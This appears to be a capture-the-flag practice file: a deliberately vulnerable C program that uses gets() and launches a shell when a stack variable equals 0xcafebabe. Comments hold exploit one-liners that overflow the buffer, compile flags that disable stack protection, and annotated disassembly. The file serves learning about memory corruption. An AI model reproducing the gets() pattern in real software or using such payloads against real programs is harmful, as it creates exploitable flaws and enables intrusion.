#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	printf("%x\n", key);
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}


/*

decompiler explorer https://dogbolt.org/

printf "00000000000000000000000000000000\xbe\xba\xfe\xca" | ./bof

hex_string="fc01f939fc01f939fc01f939fc01f939fc01f939"; echo -n $hex_string | xxd -r -p | xargs ./col

hex_string="000000000000000000000000000000000000000000001234"; echo -n $hex_string | xxd -r -p | xargs ./bof


// gcc -fno-stack-protector bof.c -o bof

1. List the existed symbols.
nm -g
2. Get the disasm code.
otool -vt

bof:
(__TEXT,__text) section
_func:
0000000100000ec0	pushq	%rbp
0000000100000ec1	movq	%rsp, %rbp
0000000100000ec4	subq	$0x50, %rsp
0000000100000ec8	leaq	0xcb(%rip), %rax
0000000100000ecf	movl	%edi, -0x4(%rbp)
0000000100000ed2	movq	%rax, %rdi
0000000100000ed5	movb	$0x0, %al
0000000100000ed7	callq	0x100000f60
0000000100000edc	leaq	-0x30(%rbp), %rdi
0000000100000ee0	movl	%eax, -0x34(%rbp)
0000000100000ee3	callq	0x100000f5a
0000000100000ee8	cmpl	$0xcafebabe, -0x4(%rbp)
0000000100000eef	movq	%rax, -0x40(%rbp)
0000000100000ef3	jne	0x100000f0d
0000000100000ef9	leaq	0xa9(%rip), %rdi
0000000100000f00	callq	0x100000f66
0000000100000f05	movl	%eax, -0x44(%rbp)
0000000100000f08	jmp	0x100000f1e
0000000100000f0d	leaq	0x9d(%rip), %rdi
0000000100000f14	movb	$0x0, %al
0000000100000f16	callq	0x100000f60
0000000100000f1b	movl	%eax, -0x48(%rbp)
0000000100000f1e	addq	$0x50, %rsp
0000000100000f22	popq	%rbp
0000000100000f23	retq
0000000100000f24	nopw	%cs:(%rax,%rax)
_main:
0000000100000f30	pushq	%rbp
0000000100000f31	movq	%rsp, %rbp
0000000100000f34	subq	$0x10, %rsp
0000000100000f38	movl	$0xdeadbeef, %eax
0000000100000f3d	movl	$0x0, -0x4(%rbp)
0000000100000f44	movl	%edi, -0x8(%rbp)
0000000100000f47	movq	%rsi, -0x10(%rbp)
0000000100000f4b	movl	%eax, %edi
0000000100000f4d	callq	0x100000ec0
0000000100000f52	xorl	%eax, %eax
0000000100000f54	addq	$0x10, %rsp
0000000100000f58	popq	%rbp
0000000100000f59	retq


call fn // pushes return address (instruction pointer + whatever)
push rbp // old base pointer
mov rsp rbp // move the stack pointer, currently pointing to the old base pointer to the bp register
sub 0x50 rsp // increase the size of the stack frame to 5*16 = 80 bytes.  sp now points to an address 80 less than the base pointer, which is pointing to the value of the old base pointer.

...              <- stack pointer (points to top of stack frame)
...
old base pointer <- base pointer
return address
old stack frame



*/
